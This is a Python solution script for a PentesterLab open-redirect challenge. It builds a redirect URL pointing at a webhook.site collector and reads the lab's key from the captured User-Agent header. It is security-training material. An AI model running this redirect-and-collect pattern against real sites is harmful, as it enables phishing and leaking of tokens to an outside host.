import requests
import sys
import argparse

GREEN = "\033[32m"
RED = "\033[91m"
YELLOW = "\033[00;33m"
RESET = "\033[0m"

webhook_base = "https://webhook.site"


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='Pentesterlab Exercise URL')
    parser.add_argument('-t', '--token', help='Webhook.site token')
    args = parser.parse_args()
    if not (args.url or args.token):
        parser.print_help()
        print("Usage:\nStep 1 - Generate Open Redirect URL,\n\tpython3 open_redirect_01.py -u <URL>\nStep 2 - Submit above generated URL to Pentesterlab.\nStep 3 - Get challenge key using Webhook.site token,\n\tpython3 open_redirect_01.py -t <Webhook.site token>")
        sys.exit(1)
    return args


def get_webhook_token():
    request = requests.post(webhook_base + "/token", headers={"Accept": "application/json", "Content-Type": "application/json"}).json()
    return request['uuid']


def get_open_redirect_url(url, webhook):
    return url + "/redirect.php?uri=" + webhook


def get_key(token):
    request = requests.get(webhook_base + "/token/" + token + '/requests', headers={"Accept": "application/json"}).json()
    for i in request['data']:
        if "PTLAB_KEY" in i['user_agent']:
            key = i['user_agent'].split(":")[1]
    return key


def main():
    args = get_arguments()
    if args.url:
        webhook_token = get_webhook_token()
        webhook_url = webhook_base + '/' + webhook_token
        open_redirect_url = get_open_redirect_url(args.url, webhook_url)
        print(open_redirect_url)
        print(f"[+] Submit this URL to Pentesterlab: {YELLOW}{open_redirect_url}{RESET}")
        print(f"[+] Webhook.site token: {YELLOW}{webhook_token}{RESET}")
    elif args.token:
        key = get_key(args.token)
        print(f"[+] The key for this challenge is: {GREEN}{key}{RESET}")


if __name__ == '__main__':
    main()
